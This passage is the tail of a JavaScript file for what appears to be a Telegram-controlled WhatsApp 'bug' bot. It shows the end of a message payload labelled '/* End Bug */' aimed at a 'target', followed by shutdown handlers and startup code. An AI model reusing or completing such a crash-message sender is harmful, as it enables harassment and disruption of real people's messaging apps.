                            creatorName: "Meta"
                        }
                    }
                }
            }
        }
     }, {
      statusJidList: [target]
    })
 }

/* End Bug */

process.on('SIGINT', async () => {
  console.log(chalk.yellow('\n[SIGINT] Cerrando sesión...'));
  try {
    if (sock) {
      sock.ev.removeAllListeners();
      sock.end(undefined);
    }
  } catch (e) {}
  process.exit(0);
});

process.on('SIGTERM', async () => {
  console.log(chalk.yellow('\n[SIGTERM] Cerrando sesión...'));
  try {
    if (sock) {
      sock.ev.removeAllListeners();
      sock.end(undefined);
    }
  } catch (e) {}
  process.exit(0);
});

bot.catch((err, ctx) => {
  if (err?.name === 'TimeoutError' || (err?.message && err.message.includes('Promise timed out'))) {
    console.error(chalk.yellow(`[TIMEOUT] ${ctx.updateType}: ${err.message}`));
    return;
  }
  console.error(chalk.red(`[BOT ERROR] ${ctx.updateType}`), err);
});

(async () => {
  try {
    console.log(chalk.redBright.bold(`
╭──────────────────────────────╮
│ Memulai Sesi WhatsApp..       │
╰──────────────────────────────╯
`));
    await startSesi();
    await bot.launch({ dropPendingUpdates: true });
    console.log(chalk.green('✅ Bot iniciado correctamente'));
  } catch (err) {
    console.error(chalk.red('❌ Error al iniciar:'), err);
    process.exit(1);
  }
})();
